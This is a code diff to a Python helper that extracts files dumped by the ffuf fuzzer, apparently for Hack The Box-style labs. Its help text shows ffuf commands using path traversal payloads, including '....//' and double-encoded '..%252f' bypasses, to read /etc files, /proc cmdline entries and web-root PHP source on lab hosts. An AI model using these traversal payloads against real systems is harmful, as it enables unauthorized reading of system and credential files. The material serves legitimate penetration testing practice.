@@ -3,14 +3,12 @@ This script will extract files from ffuf's `-od` and `-o` flags.
 """
 import argparse
 import json
-import os
 import sys
-import re
+import urllib.parse
 from pathlib import Path
 
 
 BASE_DIR = Path(__file__).resolve().parent
-RESPONSE_HEADER_REGEX = r"---- ↑ Request ---- Response ↓ ----[\s\S]*\n\n([\s\S]*)"
 HELP_TEXT = '''
 Usage:
     1. Dump files with ffuf
@@ -25,8 +23,9 @@ Examples:
         $ dfuf -o ffuf.json -od ffuf ffuf_dump
 
     2. Common files under `/etc` (8314 lines) (~1 min)
-        $ ffuf -c -u 'http://megahosting.htb/news.php?file=../../../../../../FUZZ' -w '/usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt' -fs 0 -od ffuf -o ffuf.json
+        $ ffuf -c -u 'http://snoopy.htb/download?file=....//....//....//..../FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -fs 0 -od ffuf -o ffuf.json
         $ dfuf -o ffuf.json -od ffuf ffuf_dump
+        $ tartufo scan-folder ffuf_dump/
 
     3. Brute force cmdline in `/proc` (~1 min)
         $ ffuf -c -u 'http://megahosting.htb/news.php?file=../../../../../../FUZZ' -w <(for i in $(seq 10000); echo "/proc/$i/cmdline") -fs 0 -od ffuf -o ffuf.json
@@ -34,6 +33,11 @@ Examples:
         
         View the result in a pretty format :
         $ find ffuf_dump/proc -type f -exec bash -c 'pid=$(echo $0 | cut -d '/' -f3); echo -en "\\n$pid | "; cat $0 | tr "\\0" " "' {} \; | sort -s -n -k 1,1
+
+    4. Files in web root
+        $ feroxbuster -t 150 -o ferox_443.txt -k -u https://broscience.htb/
+        $ ffuf -c -u 'https://broscience.htb/includes/img.php?path=..%252fFUZZ' -w <(cat ferox_443.txt | awk '{print $6}' | unfurl -u paths | grep '.php$') -enc 'FUZZ:urlencode' -o ffuf.json -od ffuf
+        $ dfuf -o ffuf.json -od ffuf ffuf_dump
         '''
 
 
@@ -69,10 +73,7 @@ def get_mappings(file_path: str) -> dict:
     with open(file_path, "r") as f:
         data = json.load(f)
 
-    result = {}
-    for item in data["results"]:
-        result[item["input"]["FUZZ"]] = item["resultfile"]
-    return result
+    return {item["input"]["FUZZ"]: item["resultfile"] for item in data["results"]}
 
 
 def extract_response_body(ffuf_output: str) -> str:
@@ -91,8 +92,11 @@ def extract_files(
             content = f.read()
 
         response_body = extract_response_body(content)
-        sanitized_fuzz = fuzz.replace("..", "")
-        output_fp = Path(f"{extracted_files_dir}/{sanitized_fuzz}")
+        # Recursively decode fuzzing string
+        file_path = recursive_url_decode(fuzz)
+        # Sanitize file path, prevent directory traversal
+        file_path = file_path.replace("..", "").strip()
+        output_fp = Path(f"{extracted_files_dir}/{file_path}")
         if not output_fp.parent.exists():
             output_fp.parent.mkdir(parents=True)
         with open(output_fp, "wb") as f:
@@ -100,6 +104,9 @@ def extract_files(
         # print(f"Extracted file : {output_fp}")
     print(f"[+] Done! Extracted files saved to {Path(extracted_files_dir).resolve()}")
 
+def recursive_url_decode(url:str):
+    decoded = urllib.parse.unquote_plus(url)
+    return decoded if decoded == url else recursive_url_decode(decoded)
 
 def main():
     parser = init_parser()
